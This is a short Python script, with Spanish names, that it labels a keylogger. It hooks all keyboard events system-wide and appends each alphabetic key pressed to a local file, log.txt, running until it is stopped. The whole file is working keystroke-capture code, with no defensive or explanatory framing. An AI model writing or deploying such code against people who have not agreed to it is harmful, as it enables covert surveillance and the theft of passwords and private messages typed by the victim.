import keyboard

def registrar_tecla(evento):
    if evento.event_type == 'down' and evento.name.isalpha():
        with open('log.txt', 'a') as archivo:
            archivo.write(evento.name + '\n')

def iniciar_keylogger():
    open('log.txt', 'w').close()  
    keyboard.hook(registrar_tecla)
    keyboard.wait()

iniciar_keylogger()